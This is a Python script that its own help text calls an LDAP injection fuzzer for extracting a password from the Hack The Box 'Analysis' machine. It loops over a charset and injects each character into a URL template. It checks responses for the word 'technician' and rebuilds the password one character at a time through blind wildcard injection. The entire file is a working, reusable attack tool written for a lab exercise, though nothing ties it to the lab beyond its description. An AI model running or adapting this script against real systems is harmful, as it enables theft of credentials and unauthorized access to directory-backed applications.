import argparse
import requests
import urllib.parse


def main(charset_path, base_url):
    found_chars = ""
    skip_count = 6
    add_star = True

    try:
        with open(charset_path, "r") as file:
            charset = file.read().splitlines()
    except FileNotFoundError:
        print(f"Charset file not found: {charset_path}")
        return

    try:
        while True:
            found_new_char = False
            for char in charset:
                char = char.strip()
                char_encoded = urllib.parse.quote(char)

                if "*" in char and skip_count > 0:
                    skip_count -= 1
                    continue

                if "*" in char and add_star:
                    found_chars += char
                    print(f"Found Character: {char}")
                    print(f"Current Password: {found_chars}")
                    add_star = False
                    continue

                modified_url = base_url.replace("{FUZZ}", char_encoded).replace(
                    "{found_char}", found_chars
                )

                try:
                    response = requests.get(modified_url)
                    if "technician" in response.text and response.status_code == 200:
                        found_chars += char
                        print(f"Found Character ---> {char}")
                        print(f"Current Password    ---> {found_chars}")
                        found_new_char = True
                        break
                except requests.RequestException as e:
                    print(f"Request failed: {e}")

            if not found_new_char:
                break

    except KeyboardInterrupt:
        print("\n[!] User interruption detected. Exiting...")
    finally:
        print(f"Final Password (if found): {found_chars}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ldap injection fuzzer script for password extract for HTB Analysis box")
    parser.add_argument(
        "-c", "--charset", required=True, help="Path to the charset file"
    )
    parser.add_argument("-u", "--url", required=True, help="Base URL for fuzzing")
    args = parser.parse_args()

    main(args.charset, args.url)
